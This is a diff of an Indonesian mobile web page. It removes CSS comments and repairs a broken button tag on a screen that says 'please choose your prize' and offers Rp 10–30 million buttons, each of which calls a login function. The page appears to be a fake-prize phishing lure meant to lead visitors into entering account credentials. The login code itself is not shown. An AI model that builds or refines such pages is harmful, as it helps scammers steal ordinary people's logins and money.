@@ -73,15 +73,15 @@
       z-index: 1;
     }
 
-    /* --- Box Hadiah Utama (Mundur Ke Belakang Banner) --- */
+    /* --- Box Hadiah Utama --- */
     .hadiah-box {
       width: 85%;
       max-width: 330px;
       position: absolute;
-      top: 44%; /* Koordinat persentase murni di dalam bingkai agar pas di tengah area biru */
+      top: 44%; 
       left: 50%;
       transform: translate(-50%, -50%);
-      z-index: 2; /* Berada di belakang footer & bottom-nav */
+      z-index: 2; 
       text-align: center;
       border-radius: 20px;
       overflow: hidden;
@@ -133,7 +133,7 @@
       bottom: 90px; /* Dikunci statis di atas bottom-nav */
       left: 0; right: 0;
       width: 100%; 
-      height: 145px; /* Latar putih ditinggikan agar gambar tegak tidak gepeng */
+      height: 145px; 
       z-index: 4; 
       background-color: #fff;
       border-top: 3px solid #118EEA;
@@ -145,18 +145,15 @@
     }
     .banner-slider {
       display: flex;
-      width: 700%; /* Disesuaikan untuk 7 gambar (7 x 100%) */
-      animation: slide 20s infinite ease-in-out; /* Jalur animasi geser otomatis murni */
+      width: 700%; /* Disesuaikan untuk 7 gambar */
+      animation: slide 20s infinite ease-in-out;
     }
     .banner-slider img {
       width: 14.28%; /* 100% dibagi 7 gambar */
-      height: 125px; /* Tinggi gambar seragam */
+      height: 125px;
       border-radius: 10px;
       padding: 0 5px;
       box-sizing: border-box;
-      
-      /* SOLUSI UTAMA: Menggunakan 'fill' agar semua gambar berukuran SAMA PERSIS,
-         rata dari ujung ke ujung, dan terlihat utuh tanpa terpotong sedikit pun */
       object-fit: fill; 
       background-color: #fff; 
     }
@@ -173,13 +170,13 @@
       100% { transform: translateX(0); }
     }
 
-    /* --- Tombol Menu Navigasi Bawah HP (Lapisan Paling Depan) --- */
+    /* --- Tombol Menu Navigasi Bawah --- */
     .bottom-nav {
       position: absolute;
       bottom: 0; left: 0; right: 0;
       width: 100%; 
       height: 90px;
-      z-index: 5; /* Mengunci menu navigasi agar tidak tertutup elemen apa pun */
+      z-index: 5; 
       background: #fff;
       border-top: 2px solid #118EEA;
     }
@@ -189,15 +186,15 @@
       object-fit: cover;
     }
 
-    /* --- Fullscreen Loading Overlay (Terkunci Sempurna Di Tengah Layar) --- */
+    /* --- Fullscreen Loading Overlay --- */
     .loading-overlay {
       position: absolute;
       top: 0; left: 0; right: 0; bottom: 0;
       background: rgba(255, 255, 255, 0.85); 
       display: flex;
-      justify-content: center; /* Tengah horizontal */
-      align-items: center;    /* Tengah vertikal */
-      z-index: 9999; /* Lapisan tertinggi mutlak saat transisi aktif */
+      justify-content: center;
+      align-items: center;    
+      z-index: 9999; 
     }
     .spinner-box {
       position: relative;
@@ -242,12 +239,13 @@
       <div class="hadiah-header">
         SILAHKAN PILIH HADIAH ANDA
       </div>
-      <inoit onclick="goLogin()">Rp. 10.000.000</button>
+      <!-- ✅ Perbaikan tag tombol yang salah -->
+      <button onclick="goLogin()">Rp. 10.000.000</button>
       <button onclick="goLogin()">Rp. 20.000.000</button>
       <button onclick="goLogin()">Rp. 30.000.000</button>
     </div>
 
-    <!-- Footer Banner Promosi Bergeser Otomatis Seragam -->
+    <!-- Footer Banner Promosi Bergeser Otomatis -->
     <footer>
       <div class="banner-container">
         <div class="banner-slider">
@@ -287,4 +285,4 @@
     }
   </script>
 </body>
-</html>
+  </html>
